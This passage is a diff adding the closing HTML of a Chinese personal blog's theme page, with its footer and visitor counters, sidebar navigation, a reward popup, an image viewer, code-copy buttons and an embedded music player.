+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
